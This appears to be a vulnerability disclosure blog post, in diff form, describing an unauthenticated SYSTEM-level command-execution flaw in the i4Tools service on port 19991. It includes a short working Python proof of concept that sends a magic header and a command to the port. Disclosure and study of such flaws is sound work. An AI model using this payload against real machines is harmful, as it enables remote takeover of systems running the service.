@@ -1,0 +1,49 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>i4tools unauthorized RCE</title>
+</head>
+<body>
+<b>i4tools unauthorized RCE</b><br>
+<small>2026-01-28</small>
+<hr>
+<p>i4ToolsService.exe is a service program for i4Tools (爱思助手), automatically installed upon setup, and runs with SYSTEM privileges by default.</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160441685.png" width="200"><br>
+<br>
+</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160502400.png" width="200"><br>
+<br>
+</p>
+<p>The service listens on port 19991 across all network interfaces (0.0.0.0) by default upon system startup.</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160552999.png" width="200"><br>
+<br>
+</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160619408.png" width="200"><br>
+<br>
+</p>
+<p>Cause of the vulnerability: The port lacks any authentication mechanisms and contains a backdoor.</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127160708264.png" width="200"><br>
+<br>
+</p>
+<p>The function reads up to 2048 bytes from TCP into a buffer. It then interprets the first 4 bytes of the buffer as a DWORD. If this value is 1001 (0x3E9), it stores the subsequent bytes into a destination and then proceeds to the sub_7FF7C56D28C0 function.</p>
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127161003911.png" width="200"><br>
+<br>
+</p>
+<p>sub_7FF7C56D28C0 directly executes the Destination, leading to Remote Code Execution (RCE).</p>
+<br><b><a href="#payload"></a>payload</b><br>
+<pre><code>import socket
+s = socket.socket()
+s.connect((&#x27;localhost&#x27;, 19991))
+s.send(b&#x27;\xE9\x03\x00\x00&#x27; + b&#x27;calc.exe&#x27; + b&#x27;\x00&#x27;)</code></pre>
+
+<p><br><br><img src="/2026/01/28/i4tools-unauthorized-RCE/image-20260127161125770.png" width="200"><br>
+<br>
+</p>
+<p>execute calc.exe</p>
+<br><b><a href="#Risk"></a>Risk</b><br>
+<p>Based on the previous code analysis, the service defaults to listening on all network interfaces (0.0.0.0:19991) and lacks any authentication measures. The function sub_7FF7C56D28C0 directly executes the received data, leading to Remote Code Execution (RCE). Therefore, the risks include: if the port is exposed to the public internet, attackers can remotely control the system; in virtualized environments, it may enable virtual machine escape through NAT; within the internal network, attackers can access other machines with administrator privileges.</p>
+
+<hr>
+<a href="index.html">返回首页</a> | <a href="../">返回主站</a>
+</body>
+</html>
